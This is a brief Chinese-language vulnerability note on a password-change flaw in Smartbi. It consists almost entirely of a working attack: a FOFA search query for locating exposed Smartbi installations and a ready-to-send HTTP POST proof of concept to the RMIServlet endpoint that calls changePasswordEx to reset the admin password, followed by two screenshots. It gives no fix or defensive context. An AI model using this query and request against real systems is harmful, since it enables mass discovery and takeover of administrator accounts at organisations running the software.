# Smartbi修改用户密码漏洞

Smartbi修改用户密码漏洞

## fofa

```javascript
body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
```

## poc

```javascript
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

className=UserService&methodName=changePasswordEx&params=["admin","","1"]
```

![9b32574b377d64a607e4dcacea7ebf7e](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251446830.png)

![63b435599730ed2ea73434ef51b23a30](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251447017.png)